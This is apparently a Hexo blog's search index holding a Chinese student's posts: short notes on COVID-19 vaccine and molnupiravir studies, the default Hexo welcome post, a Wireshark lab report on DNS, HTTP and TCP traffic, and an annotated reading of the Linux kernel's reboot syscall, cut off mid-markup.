<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/12/26/%E7%96%AB%E8%8B%97%E4%BD%9C%E7%94%A8/"/>
    <url>/2022/12/26/%E7%96%AB%E8%8B%97%E4%BD%9C%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="疫苗作用"><a href="#疫苗作用" class="headerlink" title="疫苗作用"></a>疫苗作用</h3><h5 id="HK-BA-2-三针疫苗，2022-1-2022-5"><a href="#HK-BA-2-三针疫苗，2022-1-2022-5" class="headerlink" title="HK,BA.2,三针疫苗，2022.1-2022.5"></a>HK,BA.2,三针疫苗，2022.1-2022.5</h5><p>两剂疫苗均未提供针对 COVID-19 感染的显着保护。然而，接受 BNT162b2 加强剂或 CoronaVac 加强剂可显着降低 omicron BA.2 感染和有症状感染的风险。</p><p>[1]Effectiveness of BNT162b2 and CoronaVac COVID-19 vaccination against asymptomatic and symptomatic infection of SARS-CoV-2 omicron BA.2 in Hong Kong: a prospective cohort study</p><p>December 12, 2022DOI:<a href="https://doi.org/10.1016/S1473-3099(22)00732-0">https://doi.org/10.1016/S1473-3099(22)00732-0</a></p><h5 id="UK，delta，omicronB-1-2021-8-2021-3"><a href="#UK，delta，omicronB-1-2021-8-2021-3" class="headerlink" title="UK，delta，omicronB.1,2021.8-2021.3"></a>UK，delta，omicronB.1,2021.8-2021.3</h5><p>以前感染过任何 SARS-CoV-2 变体都提供了一些防止有症状的再感染的保护，而疫苗接种则增加了这种保护。疫苗接种对有症状的 omicron 感染提供低到中度的保护，每次接种后保护减弱，而混合免疫提供最强大的保护。</p><p>[2]Protection against symptomatic infection with delta (B.1.617.2) and omicron (B.1.1.529) BA.1 and BA.2 SARS-CoV-2 variants after previous infection and vaccination in adolescents in England, August, 2021–March, 2022: a national, observational, test-negative, case-control study</p><p>November 24, 2022DOI:<a href="https://doi.org/10.1016/S1473-3099(22)00729-0">https://doi.org/10.1016/S1473-3099(22)00729-0</a></p><h3 id="药物作用"><a href="#药物作用" class="headerlink" title="药物作用"></a>药物作用</h3><p>与标准护理相比，molnupiravir 的通用制剂显着减少了住院率。</p><p>molnupiravir 具有良好的耐受性，尽管没有达到我们预定的阈值，但我们观察到一些证据表明 molnupiravir 在感染了广泛 SARS-CoV-2 变体的已接种和未接种疫苗的个体中具有抗病毒活性，尽管该证据不是决定性的.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/12/26/hello-world/"/>
    <url>/2022/12/26/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>test</title>
    <link href="/2022/12/26/test/"/>
    <url>/2022/12/26/test/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络-Wireshark实验</title>
    <link href="/2022/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-Wireshark%E5%AE%9E%E9%AA%8C/"/>
    <url>/2022/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-Wireshark%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<p> 实验设备和环境：<img src="/wps1.jpg" alt="wps1.jpg"> </p><p> 实验过程及步骤：（给出相应的实验环境拓扑图和实验说明，可另附页）</p><p>1） 根据实验拓扑图完成实验环境的搭建；</p><p>2） 根据相关信息进行网络配置，此处可以自己发挥，并可以故意设置错误，通过抓包来分析错误的原因，并解决此问题；</p><p><img src="/wps2.jpg" alt="img"> </p><p><img src="/wps3.jpg" alt="img"> </p><p>一开始尝试使用pc对<a href="http://www.jd.com测试ping命令未果,发现是由于混淆http和dns服务器,将dns地址设置为了http服务器的ip./">www.jd.com测试ping命令未果，发现是由于混淆HTTP和DNS服务器，将DNS地址设置为了HTTP服务器的ip。</a></p><p>3） 完成web服务器的设置：</p><p><img src="/wps4.jpg" alt="img"> </p><p>4） 完成DNS的设置：</p><p> <img src="/wps5.jpg" alt="img"> </p><p>5） 抓取浏览器的数据，观察DNS服务器及web服务器开启和没开启时的数据有何不同，并进行简单的解释说明；</p><p>①未开启DNS和web服务器时，使用浏览器发送请求：</p><p><img src="/wps6.jpg" alt="img"> </p><p>广播查找DNS服务器未果。</p><p>②仅开启DNS服务器</p><p><img src="/wps7.jpg" alt="img"> </p><p>可从DNS服务器获取目标域名的IP地址，但广播无法找到HTTP服务器。</p><p>③开启DNS和web服务器后，使用浏览器发送请求：</p><p><img src="/wps8.jpg" alt="img"> </p><p>浏览器通过DNS获得jd.com的ip地址后，向目标ip进行TCP三次握手，随后发送HTTP报文并获取响应报文获取资源，最后进行TCP四次挥手。</p><p>6） 分析HTTP协议，了解应用层协议实现的一些细节问题。使用浏览器请求网页：<img src="/wps9.jpg" alt="img"></p><p>成功接收到jd.html</p><p><img src="/wps10.jpg" alt="img"> </p><p>查看HTTP报文数据并分析：</p><p><img src="/wps11.jpg" alt="img"> </p><p>①请求报文由请求行、首部行组成。请求行有三个字段，分别是方法字段GET、URL字段&#x2F;jd.html、HTTP协议版本字段1.1。首部行分别说明了Accept-language、User-Agent、Accept-Encoding、Host、Connection方法等，由于请求报文使用了GET方法，因此报文实体体为空，因此该报文仅含报文头，为163bytes。加上TCP、IP、链路层首部共54bytes，一共217bytes。</p><p><img src="/wps12.jpg" alt="img"> </p><p><img src="/wps13.jpg" alt="img"> </p><p>②经过一系列的TCP对数据资源进行传输后，服务端发送HTTP响应报文，响应报文由初始状态行、首部行、实体体组成。初始状态行包含HTTP协议版本1.1、状态码200表示请求成功，消息在返回的响应报文中、相应状态信息OK。首部行分别说明了Server、Auth、Cache-Control、Content-Type、Content-Length等，实体体为传输的数据，长度为546103bytes。该响应报文头长度为131bytes，由于资源由TCP分片传输，选中查看TCP传输的所有数据，整个HTTP报文一共546103+131&#x3D;546234bytes。 </p>]]></content>
    
    
    <categories>
      
      <category>计算机网络-HDU</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>系统重启-Linux内核源码阅读</title>
    <link href="/2022/12/15/%E7%B3%BB%E7%BB%9F%E9%87%8D%E5%90%AF-Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    <url>/2022/12/15/%E7%B3%BB%E7%BB%9F%E9%87%8D%E5%90%AF-Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="reboot函数"><a href="#reboot函数" class="headerlink" title="reboot函数"></a>reboot函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//magic数：用于防止误操作</span><br><span class="hljs-comment">//cmd：reboot方式</span><br>SYSCALL_DEFINE4(reboot, <span class="hljs-type">int</span>, magic1, <span class="hljs-type">int</span>, magic2, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd,<br><span class="hljs-type">void</span> __user *, arg)<br>&#123;<br>    <span class="hljs-comment">//获取当前进程命名空间</span><br>    <span class="hljs-comment">//task_active_pid_ns函数</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid_namespace</span> *<span class="hljs-title">pid_ns</span> =</span> task_active_pid_ns(current);<br><span class="hljs-type">char</span> buffer[<span class="hljs-number">256</span>];<br><span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>; <br><br>    <span class="hljs-comment">//判断权限</span><br>    <br>    <span class="hljs-comment">//ns_capable函数</span><br>    <span class="hljs-comment">/*CAP_SYS_BOOT 表示允许使用 reboot() */</span><br>    <span class="hljs-comment">//#define EPERM  1 /* 允许操作 */</span><br><span class="hljs-keyword">if</span> (!ns_capable(pid_ns-&gt;user_ns, CAP_SYS_BOOT))<br><span class="hljs-keyword">return</span> -EPERM;<br>   <br><span class="hljs-comment">//magic number:魔数，这是放在linux的目录中的文件信息块中的一个标识符，一般只有几位，用来标识该文件是什么类型的文件，可以被什么样的应用使用。</span><br><span class="hljs-comment">/* For safety, we require &quot;magic&quot; arguments. */</span><br><span class="hljs-keyword">if</span> (magic1 != LINUX_REBOOT_MAGIC1 ||<br>(magic2 != LINUX_REBOOT_MAGIC2 &amp;&amp;<br>magic2 != LINUX_REBOOT_MAGIC2A &amp;&amp;<br>magic2 != LINUX_REBOOT_MAGIC2B &amp;&amp;<br>magic2 != LINUX_REBOOT_MAGIC2C))<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-comment">//#define EINVAL 22 /* 无效参数 */</span><br><br><span class="hljs-comment">/*判断当前ns是否处于子进程ns中</span><br><span class="hljs-comment"> * If pid namespaces are enabled and the current task is in a child</span><br><span class="hljs-comment"> * pid_namespace, the command is handled by reboot_pid_ns() which will</span><br><span class="hljs-comment"> * call do_exit().</span><br><span class="hljs-comment"> */</span><br>ret = reboot_pid_ns(pid_ns, cmd);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-comment">/* Instead of trying to make the power_off code look like</span><br><span class="hljs-comment"> * halt when pm_power_off is not set do it the easy way.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((cmd == LINUX_REBOOT_CMD_POWER_OFF) &amp;&amp; !pm_power_off)<br>cmd = LINUX_REBOOT_CMD_HALT;<br><span class="hljs-comment">//* LINUX_REBOOT_CMD_POWER_OFF 如果可能，停止操作系统并断开系统的所有电源。</span><br>    <span class="hljs-comment">//* LINUX_REBOOT_CMD_HALT 停止操作系统并将系统控制权交给 ROM 监视器（如果有）。</span><br>    <br>    <br>mutex_lock(&amp;reboot_mutex);<span class="hljs-comment">//获取互斥</span><br>    <br><span class="hljs-comment">/* </span><br><span class="hljs-comment">* _reboot() 系统调用接受的命令。</span><br><span class="hljs-comment">* </span><br><span class="hljs-comment">* RESTART 使用默认命令和模式重新启动系统。</span><br><span class="hljs-comment">* HALT 停止操作系统并将系统控制权交给 ROM 监视器（如果有）。</span><br><span class="hljs-comment">* CAD_ON Ctrl-Alt-Del 序列导致 RESTART 命令。</span><br><span class="hljs-comment">* CAD_OFF Ctrl-Alt-Del 序列将 SIGINT 发送到 init 任务。</span><br><span class="hljs-comment">* POWER_OFF 如果可能，停止操作系统并断开系统的所有电源。</span><br><span class="hljs-comment">* RESTART2 使用给定的命令字符串重新启动系统。</span><br><span class="hljs-comment">* SW_SUSPEND 使用软件挂起系统，如果编译在其中。</span><br><span class="hljs-comment">* KEXEC 使用先前加载的 Linux 内核重新启动系统</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_RESTART:<br>kernel_restart(<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_CAD_ON:<br>C_A_D = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_CAD_OFF:<br>C_A_D = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_HALT:<br>kernel_halt();<br>do_exit(<span class="hljs-number">0</span>);<br>panic(<span class="hljs-string">&quot;cannot halt&quot;</span>);<br><br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_POWER_OFF:<br>kernel_power_off();<br>do_exit(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_RESTART2:<br>ret = strncpy_from_user(&amp;buffer[<span class="hljs-number">0</span>], arg, <span class="hljs-keyword">sizeof</span>(buffer) - <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>ret = -EFAULT;<span class="hljs-comment">/* 错误地址 */</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br>buffer[<span class="hljs-keyword">sizeof</span>(buffer) - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>kernel_restart(buffer);<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEXEC_CORE</span><br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_KEXEC:<br>ret = kernel_kexec();<br><span class="hljs-keyword">break</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_HIBERNATION</span><br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_SW_SUSPEND:<br>ret = hibernate();<br><span class="hljs-keyword">break</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">default</span>:<br>ret = -EINVAL;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>mutex_unlock(&amp;reboot_mutex);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="task-active-pid-ns"><a href="#task-active-pid-ns" class="headerlink" title="task_active_pid_ns()"></a>task_active_pid_ns()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//获取任务中包含进程的命名空间信息</span><br><br><span class="hljs-comment">//命名空间，namespace 是 Linux 内核用来隔离内核资源的方式。通过 namespace 可以让一些进程只能看到与自己相关的一部分资源，而另外一些进程也只能看到与它们自己相关的资源，这两拨进程根本就感觉不到对方的存在。</span><br><span class="hljs-keyword">struct</span> pid_namespace *<span class="hljs-title function_">task_active_pid_ns</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk)</span><br>&#123;<br><span class="hljs-comment">//首先调用函数task_pid()获得任务字段pids[PIDTYPE_PID]的pid值，然后调用函数ns_of_pid()获取函数task_pid()返回值的命名空间信息。</span><br><span class="hljs-keyword">return</span> ns_of_pid(task_pid(tsk));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ns-capable"><a href="#ns-capable" class="headerlink" title="ns_capable()"></a>ns_capable()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//判断ns是否有需要的权限，如果有，在task上设置PF_SUPERPRIV</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">ns_capable</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> user_namespace *ns, <span class="hljs-type">int</span> cap)</span><br>&#123;<br>    <span class="hljs-comment">//1-2-1 ns_capable_common函数</span><br><span class="hljs-keyword">return</span> ns_capable_common(ns, cap, CAP_OPT_NONE);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ns-capable-common"><a href="#ns-capable-common" class="headerlink" title="ns_capable_common()"></a>ns_capable_common()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//判断权限</span><br><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">ns_capable_common</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> user_namespace *ns,</span><br><span class="hljs-params">                        <span class="hljs-type">int</span> cap,</span><br><span class="hljs-params">                        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> opts)</span><br>&#123;<br><span class="hljs-type">int</span> capable;<br>    <span class="hljs-comment">//unlikely：表示执行else的可能性更大，方便编译减少指令跳转</span><br>    <span class="hljs-keyword">if</span> (unlikely(!cap_valid(cap))) &#123;<span class="hljs-comment">//cap_valid宏定义</span><br>        pr_crit(<span class="hljs-string">&quot;capable() called with invalid cap=%u\n&quot;</span>, cap);<span class="hljs-comment">//pr_crit宏定义</span><br>        BUG();<span class="hljs-comment">//BUG宏定义</span><br>        &#125;<br><span class="hljs-comment">//security_capable函数</span><br>    capable = security_capable(current_cred(), ns, cap, opts);<br>    <span class="hljs-keyword">if</span> (capable == <span class="hljs-number">0</span>) &#123;<br>        current-&gt;flags |= PF_SUPERPRIV;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="宏BUG"><a href="#宏BUG" class="headerlink" title="宏BUG()"></a>宏BUG()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//BUG提示</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUG()do &#123;\</span><br><span class="hljs-meta">pr_warn(<span class="hljs-string">&quot;BUG: failure at %s:%d/%s()!\n&quot;</span>, __FILE__, __LINE__, __func__); \</span><br><span class="hljs-meta">barrier_before_unreachable();\</span><br><span class="hljs-meta">__builtin_trap();\</span><br><span class="hljs-meta">&#125; while (0)</span><br></code></pre></td></tr></table></figure><h5 id="宏pr-crit"><a href="#宏pr-crit" class="headerlink" title="宏pr_crit()"></a>宏pr_crit()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//打印信息</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pr_crit(fmt, ...) \</span><br><span class="hljs-meta">printk(KERN_CRIT pr_fmt(fmt), ##__VA_ARGS__)</span><br></code></pre></td></tr></table></figure><h5 id="宏cap-valid"><a href="#宏cap-valid" class="headerlink" title="宏cap_valid()"></a>宏cap_valid()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//cap_valid用来检查 cap所表示的权能是否在内核事先定义的权限范围内. 真正的权能检查是在security_capable中</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> cap_valid(x) ((x) &gt;= 0 &amp;&amp; (x) &lt;= CAP_LAST_CAP)</span><br></code></pre></td></tr></table></figure><h5 id="security-capable"><a href="#security-capable" class="headerlink" title="security_capable()"></a>security_capable()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//cred：进程安全上下文</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">security_capable</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> cred *cred,</span><br><span class="hljs-params">     <span class="hljs-keyword">struct</span> user_namespace *ns,</span><br><span class="hljs-params">     <span class="hljs-type">int</span> cap,</span><br><span class="hljs-params">     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> opts)</span><br>&#123;<br><span class="hljs-keyword">return</span> call_int_hook(capable, <span class="hljs-number">0</span>, cred, ns, cap, opts);<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="宏call-int-hook"><a href="#宏call-int-hook" class="headerlink" title="宏call_int_hook()"></a>宏call_int_hook()</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//调用注册的权限检查算法的具体实现函数，依次调用安装到钩子上的安全模块函数进行检查</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> call_int_hook(FUNC, IRC, ...) (&#123;\</span><br><span class="hljs-meta">int RC = IRC;\</span><br><span class="hljs-meta">do &#123;\</span><br><span class="hljs-meta">struct security_hook_list *P;\</span><br><span class="hljs-meta">\</span><br><span class="hljs-meta"><span class="hljs-comment">//hlist_for_each_entry访问hash链表</span></span><br><span class="hljs-comment">//LSM 中使用security_hook_heads 将各访问控制模块的接口管理起来</span><br>hlist_for_each_entry(P, &amp;security_hook_heads.FUNC, <span class="hljs-built_in">list</span>) &#123; \<br>RC = P-&gt;hook.FUNC(__VA_ARGS__);\<br><span class="hljs-keyword">if</span> (RC != <span class="hljs-number">0</span>)\<br><span class="hljs-keyword">break</span>;\<br>&#125;\<br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>);\<br>RC;\<br>&#125;)<br><br></code></pre></td></tr></table></figure><h3 id="reboot-pid-ns"><a href="#reboot-pid-ns" class="headerlink" title="reboot_pid_ns()"></a>reboot_pid_ns()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">reboot_pid_ns</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pid_namespace *pid_ns, <span class="hljs-type">int</span> cmd)</span><br>&#123;<br><span class="hljs-keyword">if</span> (pid_ns == &amp;init_pid_ns)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_RESTART2:<br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_RESTART:<br>pid_ns-&gt;reboot = SIGHUP;<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_POWER_OFF:<br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_HALT:<br>pid_ns-&gt;reboot = SIGINT;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br>read_lock(&amp;tasklist_lock);<br>send_sig(SIGKILL, pid_ns-&gt;child_reaper, <span class="hljs-number">1</span>);<br>read_unlock(&amp;tasklist_lock);<br><br>do_exit(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">/* Not reached */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="mutex-lock"><a href="#mutex-lock" class="headerlink" title="mutex_lock()"></a>mutex_lock()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __sched <span class="hljs-title function_">mutex_lock</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mutex *lock)</span><br>&#123;<br>might_sleep();<br><br><span class="hljs-keyword">if</span> (!__mutex_trylock_fast(lock))<br>__mutex_lock_slowpath(lock);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="might-sleep-宏"><a href="#might-sleep-宏" class="headerlink" title="might_sleep()宏"></a>might_sleep()宏</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"># define might<span class="hljs-constructor">_sleep()</span> \<br><span class="hljs-keyword">do</span> &#123; <span class="hljs-constructor">__might_sleep(<span class="hljs-params">__FILE__</span>, <span class="hljs-params">__LINE__</span>, 0)</span>; might<span class="hljs-constructor">_resched()</span>; &#125; <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>)<br><span class="hljs-comment">/**</span><br></code></pre></td></tr></table></figure><h4 id="mutex-trylock"><a href="#mutex-trylock" class="headerlink" 